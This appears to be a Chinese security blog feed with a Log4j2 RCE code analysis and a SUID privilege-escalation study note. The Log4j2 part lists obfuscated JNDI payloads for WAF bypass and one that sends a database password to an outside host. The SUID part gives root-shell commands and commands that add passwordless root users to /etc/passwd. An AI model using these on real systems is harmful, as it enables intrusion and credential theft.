<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">encode</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> ByteBufferDestination destination)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="built_in">this</span>.eventSerializer <span class="keyword">instanceof</span> Serializer2)) &#123;</span><br><span class="line">        <span class="built_in">super</span>.encode(event, destination);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 跟入toText方法</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">text</span> <span class="operator">=</span> <span class="built_in">this</span>.toText((Serializer2)<span class="built_in">this</span>.eventSerializer, event, getStringBuilder());</span><br><span class="line">        Encoder&lt;StringBuilder&gt; encoder = <span class="built_in">this</span>.getStringBuilderEncoder();</span><br><span class="line">        encoder.encode(text, destination);</span><br><span class="line">        trimToMaxSize(text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> StringBuilder <span class="title function_">toText</span><span class="params">(<span class="keyword">final</span> Serializer2 serializer, <span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder destination)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> serializer.toSerializable(event, destination);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="消息格式化"><a href="#消息格式化" class="headerlink" title="消息格式化"></a>消息格式化</h3><p>跟入<code>toSerializable</code>方法，遍历类型为<code>org.apache.logging.log4j.core.pattern.PatternFormatter</code>类的<code>formatters</code>数组，调用其<code>format</code>方法，这里只需关注第8次循环的<code>format</code>方法，漏洞就是在这个<code>format</code>中触发</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123174526935.png" class="" title="image-20220123174526935">

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.skipFormattingInfo) &#123;</span><br><span class="line">        <span class="comment">// 第8次循环的converter实现为MessagePatternConverter类，跟入</span></span><br><span class="line">        <span class="built_in">this</span>.converter.format(event, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.formatWithInfo(event, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再看看<code>MessagePatternConverter</code>中的<code>format</code>实现，在判断log内容包含<code>$&#123;</code>后，将<code>evet</code>带入的<code>replace</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> &#123;</span><br><span class="line">    <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> event.getMessage();</span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">doRender</span> <span class="operator">=</span> <span class="built_in">this</span>.textRenderer != <span class="literal">null</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">workingBuilder</span> <span class="operator">=</span> doRender ? <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="number">80</span>) : toAppendTo;</span><br><span class="line">        <span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> workingBuilder.length();</span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">            ((MultiFormatStringBuilderFormattable)msg).formatTo(<span class="built_in">this</span>.formats, workingBuilder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ((StringBuilderFormattable)msg).formatTo(workingBuilder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.config != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.noLookups) &#123;  <span class="comment">// 2.14.1及一下版本的noLookups默认为false</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">                <span class="comment">// 判断log内容是否包含&#x27;$&#123;&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line">                    <span class="comment">// 跟入replace方法</span></span><br><span class="line">                    workingBuilder.append(<span class="built_in">this</span>.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>org.apache.logging.log4j.core.util.Constants</code>类中可以看到noLookpus默认为false</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</span> <span class="operator">=</span> PropertiesUtil.getProperties().getBooleanProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<h3 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h3><p>跟入<code>org.apache.logging.log4j.core.lookup.StrSubstitutor</code>类的<code>replace</code>方法，里面调用<code>StrSubstitutor</code>类的<code>substitute</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(source);</span><br><span class="line">        <span class="comment">// 跟入</span></span><br><span class="line">        <span class="keyword">return</span> !<span class="built_in">this</span>.substitute(event, buf, <span class="number">0</span>, source.length()) ? source : buf.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">substitute</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="type">int</span> offset, <span class="keyword">final</span> <span class="type">int</span> length)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.substitute(event, buf, offset, length, (List)<span class="literal">null</span>) &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着看看<code>StrSubstitutor</code>类，定义了一些类型为<code>org.apache.logging.log4j.core.lookup.StrMatcher</code>的成员变量，如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">char</span> <span class="variable">DEFAULT_ESCAPE</span> <span class="operator">=</span> <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">StrMatcher</span> <span class="variable">DEFAULT_PREFIX</span> <span class="operator">=</span> StrMatcher.stringMatcher(<span class="string">&quot;$&#123;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">StrMatcher</span> <span class="variable">DEFAULT_SUFFIX</span> <span class="operator">=</span> StrMatcher.stringMatcher(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_VALUE_DELIMITER_STRING</span> <span class="operator">=</span> <span class="string">&quot;:-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">StrMatcher</span> <span class="variable">DEFAULT_VALUE_DELIMITER</span> <span class="operator">=</span> StrMatcher.stringMatcher(<span class="string">&quot;:-&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ESCAPE_DELIMITER_STRING</span> <span class="operator">=</span> <span class="string">&quot;:\\-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">StrMatcher</span> <span class="variable">DEFAULT_VALUE_ESCAPE_DELIMITER</span> <span class="operator">=</span> StrMatcher.stringMatcher(<span class="string">&quot;:\\-&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>可以理解<code>StrMatcher</code>类为<code>log4j</code>内置的字符匹配器，先看下该类的<code>isMath</code>方法，可以看到是指定一个char数组的起始位置和匹配长度去匹配另一个char数组，若完全匹配上则返回匹配上的长度，没匹配上返回<code>0</code>，该方法在接下来的<code>substitute</code>方法中会用到较多，所以这里提一下</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123190427560.png" class="" title="image-20220123174526935">

<p>接下来看<code>StrSubstitutor</code>类的<code>substitute</code>，该方法就是本次漏洞触发的关键方法</p>
<p>先while循环去匹配字符串中的前缀字符<code>$&#123;</code></p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123192824964.png" class="" title="image-20220123192824964">

<p>接着将前缀<code>$&#123;</code>后面的字符串通过while循环匹配后缀<code>&#125;</code>，在while循环中匹配后缀之前，会先判断剩下的字符串是否还存在前缀，每匹配一次前缀则<code>nestedVarCount</code>加一，当该变量不为<code>0</code>且匹配中一次后缀<code>&#125;</code>会减一，通过该变量来匹配出最外层<code>$&#123;&#125;</code>包裹的表达式，然后将匹配后的表达式继续往下递归，以满足嵌套的场景</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123194612458.png" class="" title="image-20220123194612458">

<p>接着判断是否包含<code>:-</code>和<code>:\-</code>分割符，然后做一些分割处理（变形思路1），这里判断较多，就不挨个描述，简单概括为</p>
<ul>
<li><code>:-</code> 是一个分割符，如果程序处理到 <code>$&#123;aaaa:-bbbb&#125;</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。</li>
<li><code>:\-</code> 是转义的 <code>:-</code>，如果一个用 <code>a:b</code> 表示的键值对的 key <code>a</code> 中包含 <code>:</code>，则需要使用转义来配合处理，例如 <code>$&#123;aaa:\\-bbb:-ccc&#125;</code>，代表 key 是，<code>aaa:bbb</code>，value 是 <code>ccc</code>。</li>
</ul>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123203000204.png" class="" title="image-20220123203000204">

<p>在没有匹配上分隔符或分割处理完后，会调用<code>resolveVariable</code>方法进行解析，将返回的结果替换回原字符串后，再次调用 <code>substitute</code> 方法进行递归解析</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210610548.png" class="" title="image-20220123210610548">

<h3 id="Lookup"><a href="#Lookup" class="headerlink" title="Lookup"></a>Lookup</h3><p><code>resolveVariable</code>方法会调用<code>resolver</code>解析器的<code>lookup</code>方法，可以看到这里<code>resolver</code>支持12种类型的<code>lookup</code>实现（变形思路2）</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123204742879.png" class="" title="image-20220123204742879">

<p>接着跟入<code>lookup</code>方法，来到了<code>org.apache.logging.log4j.core.lookup.Interpolator</code>拦截器，该拦截器通过不同前缀分配对应的<code>lookup</code>方法实现</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210035434.png" class="" title="image-20220123210035434">

<p>继续跟进<code>lookup</code>可以看到，我们传入的是jndi前缀，所以会调用<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>的<code>lookup</code>方法，到这就触发漏洞了。</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210252342.png" class="" title="image-20220123210252342">

<h2 id="0x02-payload变形思路"><a href="#0x02-payload变形思路" class="headerlink" title="0x02 payload变形思路"></a>0x02 payload变形思路</h2><h3 id="增加-干扰"><a href="#增加-干扰" class="headerlink" title="增加:-干扰"></a>增加<code>:-</code>干扰</h3><p>上面说到当字符串种包含<code>:-</code>和<code>:\-</code>会做一些处理，我们就可以该处理逻辑来变形绕过一些waf，例如<code>$&#123;$&#123;p0melo:-j&#125;ndi:ldap://127.0.0.1:1389/kk2err&#125;</code></p>
<h3 id="嵌套其他协议"><a href="#嵌套其他协议" class="headerlink" title="嵌套其他协议"></a>嵌套其他协议</h3><p>上面分析中可以看到<code>StrLookup</code>除了支持jndi协议还支持其他协议<code>&#123;date, ctx, lower, upper, main, env, sys, sd, java, marker, jndi, jvmrunargs, event, bundle, map, log4j&#125;</code>，所以我们可以通过其他协议变形payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;lower:j&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;di:$&#123;lower::::l&#125;dap:<span class="comment">//127.0.0.1:1389/kk2err&#125; // 可以嵌套多个</span></span><br></pre></td></tr></table></figure>

<p>当然我们也可以组合上面两种思路，例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;lower:$&#123;p0melo:-j&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;p0melo:-$&#123;lower:J&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123221821111.png" class="" title="image-20220123221821111">

<h3 id="Bundle外带"><a href="#Bundle外带" class="headerlink" title="Bundle外带"></a><strong>Bundle外带</strong></h3><p>方法来自<a class="link"   href="https://b1ue.cn/archives/513.html" >浅蓝师傅博客<i class="fas fa-external-link-alt"></i></a> ，还可以使用Bundle获取特殊变量值并外带，spring环境下可以尝试获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//jndi.fuzz.red:5/ku8r/$&#123;bundle:application:spring.datasource.password&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220302220853565.png" class="" title="image-20220302220853565">
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>suid提权学习</title>
    <url>/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在p牛博客看到有关suid提权的<a class="link"   href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >文章<i class="fas fa-external-link-alt"></i></a>，所以打算对linux suid提权这块学习记录下，由于是首次接触suid的概念，所以文章前面定义部分记录的比较详细（啰嗦），以便后续学习。</p>
<h2 id="0x01-什么是SUID"><a href="#0x01-什么是SUID" class="headerlink" title="0x01 什么是SUID"></a>0x01 什么是SUID</h2><h3 id="1-1-SUID"><a href="#1-1-SUID" class="headerlink" title="1.1 SUID"></a>1.1 SUID</h3><p>SUID全称是Set owner User ID up on execution，suid是赋予二进制文件一个权限，它允许程序执行者在执行时具有该程序的拥有者(owner)的权限，对于SUID权限的文件基本有这样的限制与功能：</p>
<ul>
<li><strong>SUID权限仅对二进制程序有效</strong></li>
<li><strong>执行者对于该程序需要具有x的可执行权限</strong></li>
<li><strong>本权限仅在执行该程序的过程中有效（run-time）</strong></li>
<li><strong>执行者将具有该程序拥有者的（owner）权限</strong></li>
</ul>
<p>这里举个栗子说明下，linux中每个用户的账号密码都存储在<code>/etc/shadow</code>文件中，该文件的权限为<code>-rw-r-----</code>，普通用户无法直接修改，但每个用户都可以通过<code>passwd</code>命令来修改自己的密码，为什么&#x2F;etc&#x2F;shadow只允许root用户读取修改的，普通用户却能够修改这个文件内的密码呢？这就是SUID的作用。</p>
<p><code>passwd</code>命令对应的路径是<code>/usr/bin/passwd</code>，我们可以看到它的文件权限为<code>-rwsr-xr-x</code>，这里<code>passwd</code>设置了SUID权限，我们来看下普通用户tester如何通过SUID权限完成修改密码操作的：</p>
<ol>
<li>tester 用户对于 &#x2F;usr&#x2F;bin&#x2F;passwd 这个程序具有执行权限，因此可以执行 passwd 程序</li>
<li>passwd 程序的所有者为 root</li>
<li>tester 用户执行 passwd 程序的过程中会暂时获得 root 权限</li>
<li>因此 tester 用户在执行 passwd 程序的过程中可以修改 &#x2F;etc&#x2F;shadow 文件</li>
</ol>
<p>普通用户直接使用<code>cat</code>查看<code>/etc/shadow</code>文件是被禁止的，这里用一张示意图来表示两者区别</p>
<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/952033-20180915174007691-528388363.png" class="" title="img">

<p>另外需要注意的是，SUID仅可用于二进制程序上，<strong>但不能够用在shell脚本上面</strong>。这是因为shell脚本是由多个二进制执行文件进行调用执行而已，所以是否有SUID权限还是看调用的二进制执行文件，而不是shell脚本本身。当然，<strong>SUID对于目录也是无效的</strong>。</p>
<p>在搜索学习SUID时也了解到了SGID、SBIT的定义，这里也顺带提下</p>
<h3 id="1-2-SGID"><a href="#1-2-SGID" class="headerlink" title="1.2 SGID"></a>1.2 SGID</h3><p>与SUID不同的是，SGID可以针对文件或目录来设置。如果是对文件来说，SGID有如下的功能：</p>
<ul>
<li>SGID对二进制程序有用</li>
<li>程序执行者对于该程序来说，需具备x的权限</li>
<li>执行者在执行的过程中将会获得改程序用户组的支持</li>
</ul>
<p>举个栗子，使用<code>/usr/bin/locate</code>这个程序可以去查找<code>/var/lib/mlocate/mlocate.db</code>这个文件的内容，查看对应文件权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root 24 Nov 17  2020 /usr/bin/locate -&gt; /etc/alternatives/locate</span><br><span class="line">lrwxrwxrwx 1 root root 16 Nov 17  2020 /etc/alternatives/locate -&gt; /usr/bin/mlocate</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">locate是软链接指向mlocate，所以修改软连接locate的sgid权限也就是修改mlocate</span></span><br><span class="line">-rwxr-sr-x 1 root mlocate 39608 Nov 15  2018 /usr/bin/mlocate</span><br><span class="line">-rw-r----- 1 root mlocate 1292585 Jun 26 14:25 /var/lib/mlocate/mlocate.db</span><br></pre></td></tr></table></figure>

<p>如果我使用普通用户tester执行locate时，tester将会取得mlocate组的支持，因此就可以去读取mlocate.db的内容了。执行过程示意图如下</p>
<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/952033-20180915174309311-990901650.png" class="" title="img">

<p>另外，SGID对目录也支持，当用户对某一目录有写和执行权限时，该用户就可以在该目录下建立文件，如果该目录用 SGID 修饰，则该用户在这个目录下建立的文件都是属于这个目录所属的组。如下图示例，sgidtest目录属于root组，且赋予了SGID权限，poom用户在该目录下创建文件将为root属组。</p>
<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626231049994.png" class="" title="image-20210626231049994">

<h3 id="1-3-SBIT"><a href="#1-3-SBIT" class="headerlink" title="1.3 SBIT"></a>1.3 SBIT</h3><p>其实 SBIT 与 SUID 和 SGID 的关系并不大。SBIT 是 the restricted deletion flag or sticky bit 的简称。SBIT 目前只对目录有效，用来阻止非文件的所有者删除文件。比较常见的例子就是 &#x2F;tmp 目录：</p>
<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626231156650.png" class="" title="image-20210626231156650">

<p>权限信息中最后一位 t 表明该目录被设置了 SBIT 权限。SBIT 对目录的作用是：当用户在该目录下创建新文件或目录时，仅有自己和 root 才有权力删除。</p>
<h3 id="1-4-如何设置SUID、SGID、SBIT权限"><a href="#1-4-如何设置SUID、SGID、SBIT权限" class="headerlink" title="1.4 如何设置SUID、SGID、SBIT权限"></a>1.4 如何设置SUID、SGID、SBIT权限</h3><p>SUID、SGID、SBIT权限对应的数字为<code>SUID-&gt;4，SGID-&gt;2，SBIT-&gt;1</code></p>
<p>通过数字法设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 4755 filename</span><br></pre></td></tr></table></figure>

<p>通过符号法设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod u+s filename</span><br><span class="line">chmod g+s filename </span><br><span class="line">chmod o+s filename</span><br></pre></td></tr></table></figure>

<p>若权限为大写S或T，则说明user&#x2F;group&#x2F;others本身就没有执行权限。</p>
<h2 id="0x02-关于SUID提权"><a href="#0x02-关于SUID提权" class="headerlink" title="0x02 关于SUID提权"></a>0x02 关于SUID提权</h2><p>先介绍下linux进程在运行时有3个UID:</p>
<ul>
<li>Real UID 执行该进程的用户实际的UID</li>
<li>Effective UID 程序实际操作时生效的UID（比如写入文件时，系统会检查这个UID是否有权限）</li>
<li>Saved UID 在高权限用户降权后，保留的其原本UID</li>
</ul>
<p>在设置了SUID权限的程序在其运行时，进程的Effective UID将为程序的拥有者。例如前面说的<code>/user/bin/passwd</code>命令的权限为<code>-rwsr-xr-x</code>，程序的拥有者为root（uid&#x3D;0），普通用户在执行<code>passwd</code>命令时Effective UID就为0，所以可以完成更改密码的操作。</p>
<p>我们知道nmap需要进行UDP或TCP SYN扫描时需要用到root权限，所以很多管理员会给nmap加上SUID权限，这样普通用户就可以随便使用nmap了。在nmap 5.20版本以前存在interactive交互模式，当nmap设置了SUID权限时，我们可以进入交互模式输入<code>!sh</code>提权。</p>
<p>所以<strong>拥有SUID的程序存在命令注入漏洞或其本身存在执行命令的功能，且这个程序所有者的uid为0或其他super user</strong>，那么就有SUID提权的风险。</p>
<p><strong>如何查找具有SUID权限的文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>

<p>也可通过<code>sudo -l</code>列出当前用户可sudo执行的命令</p>
<h2 id="0x03-常用于SUID提权的命令"><a href="#0x03-常用于SUID提权的命令" class="headerlink" title="0x03 常用于SUID提权的命令"></a>0x03 常用于SUID提权的命令</h2><p>下面介绍几种命令，如果这些命令具有SUID权限，将有本地提权的风险。</p>
<h3 id="3-1-nmap"><a href="#3-1-nmap" class="headerlink" title="3.1 nmap"></a>3.1 nmap</h3><h4 id="3-1-1-nmap-2-02-5-21版本"><a href="#3-1-1-nmap-2-02-5-21版本" class="headerlink" title="3.1.1 nmap 2.02-5.21版本"></a>3.1.1 nmap 2.02-5.21版本</h4><p>namp在低版本具有交互模式，可利用交互模式提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure>

<p>另外Metasploit也有nmap提权的模块：<code>exploit/unix/local/setuid_nmap</code></p>
<h4 id="3-1-2-nmap高版本"><a href="#3-1-2-nmap高版本" class="headerlink" title="3.1.2 nmap高版本"></a>3.1.2 nmap高版本</h4><p>namp在高版本取消了交互模式，可编写nmap的nse脚本，修改<code>/etc/passwd</code>来新增一个用户root2来达到提权的目的。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> file = <span class="built_in">io</span>.<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">file:<span class="built_in">write</span>(<span class="string">&quot;root2::0:0::/root:/bin/bash\n&quot;</span>)</span><br><span class="line">file:<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626174624539.png" class="" title="image-20210626174624539">

<p>若namp可直接sudo执行，则可直接使用nse脚本调用<code>os.execute</code>执行命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/sh&#x27;)&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse</span><br></pre></td></tr></table></figure>

<h3 id="3-2-find"><a href="#3-2-find" class="headerlink" title="3.2 find"></a>3.2 find</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627125229567.png" class="" title="image-20210627125229567">

<h3 id="3-3-vi-x2F-vim"><a href="#3-3-vi-x2F-vim" class="headerlink" title="3.3 vi&#x2F;vim"></a>3.3 vi&#x2F;vim</h3><p>进入vim模式执行以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627134106867.png" class="" title="image-20210627134106867">

<p>若有sudo权限则可执行<code>sudo vim -c &#39;!sh&#39;</code>直接提权</p>
<h3 id="3-4-bash"><a href="#3-4-bash" class="headerlink" title="3.4 bash"></a>3.4 bash</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627134208588.png" class="" title="image-20210627134208588">

<h3 id="3-5-cp"><a href="#3-5-cp" class="headerlink" title="3.5 cp"></a>3.5 cp</h3><p>跟高版本nmap提权方法类似，覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd &gt;passwd</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;root3::0:0::/root:/bin/bash&#x27;</span> &gt;&gt;passwd</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> passwd /etc/passwd</span>  </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">su root3</span> </span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627142406117.png" class="" title="image-20210627142406117">

<h3 id="3-6-mv"><a href="#3-6-mv" class="headerlink" title="3.6 mv"></a>3.6 mv</h3><p>同cp命令的步骤，覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p>
<h3 id="3-7-nano"><a href="#3-7-nano" class="headerlink" title="3.7 nano"></a>3.7 nano</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nano filename</span><br></pre></td></tr></table></figure>

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627143244017.png" class="" title="image-20210627143244017">

<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627143211352.png" class="" title="image-20210627143211352">

<h3 id="3-8-wget"><a href="#3-8-wget" class="headerlink" title="3.8 wget"></a>3.8 wget</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://192.168.88.88/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>

